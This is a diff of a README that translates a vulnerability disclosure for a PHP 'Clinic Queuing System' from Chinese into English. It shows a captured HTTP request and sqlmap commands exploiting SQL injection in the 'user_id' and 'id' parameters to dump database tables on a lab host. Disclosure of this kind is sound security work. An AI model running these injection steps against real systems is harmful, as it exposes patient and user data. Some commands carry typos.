@@ -1,12 +1,12 @@
 # Clinic-Queuing-System
 Clinic Queuing System Vulnerability exploitation
-# 注入点1
-功能点：Users->Add New
+# Injection point 1
+Function points：Users->Add New
  ![image text](https://github.com/c1earyy/Clinic-Queuing-System/blob/main/1.png)
-输入所有信息save并用burpsuite抓包
+Enter all information to save and capture the package using burpsuite
  ![image text](https://github.com/c1earyy/Clinic-Queuing-System/blob/main/2.png)
  ![image text](https://github.com/c1earyy/Clinic-Queuing-System/blob/main/3.png)
-数据包
+data packet
 ```
 POST /php-sqlite-cqs/LoginRegistration.php?a=save_user HTTP/1.1
 Host: 192.168.17.1
@@ -25,30 +25,30 @@ Connection: close
 formToken=%242y%2410%24yN7Wr9kopiTJpbrSGGgaF.2Ufy.K9X2Sw1jaHwM1Z3HWM%2Fb.LYgwm&user_id=&fullname=yy&username=yy&password=123456&type=1&status=0
 ```
 
-Sqlmap命令
+Sqlmap command
 ```python
 py .\sqlmap.py -r .\1.txt -p user_id –tables
 ```
 
-user_id参数存在sql注入，成功注入到tables
+User_id parameter has SQL injection and was successfully injected into tables
  ![image text](https://github.com/c1earyy/Clinic-Queuing-System/blob/main/4.png)
 
-# 注入点2
-点击 +Add Record，填写好信息，save
+# Injection point 2
+Click +Add Record, fill in the information, and save
  ![image text](https://github.com/c1earyy/Clinic-Queuing-System/blob/main/5.png)
-功能点：Patient List->view patient
-点击view patient之前打开burpsuite工具进行抓包
+Function points：Patient List->view patient
+Open the burpsuite tool to capture packets before clicking on view patient
  ![image text](https://github.com/c1earyy/Clinic-Queuing-System/blob/main/6.png)
  ![image text](https://github.com/c1earyy/Clinic-Queuing-System/blob/main/7.png)
-把抓到的数据包放进sqlmap工具里。
+Put the captured data packets into the sqlmap tool
 
-漏洞url
+Vulnerability URL
 ```
 http://192.168.17.1/php-sqlite-cqs/?page=view_patient&id=23
 ```
-Sqlmap命令
+Sqlmap command
 ```python
 py .\sqlmap.py -r .\1.txt -p id --tables –batch
 ```
-id为sql注入参数，成功注入到tebles
+id is an SQL injection parameter, successfully injected into Tebles
  ![image text](https://github.com/c1earyy/Clinic-Queuing-System/blob/main/8.png)
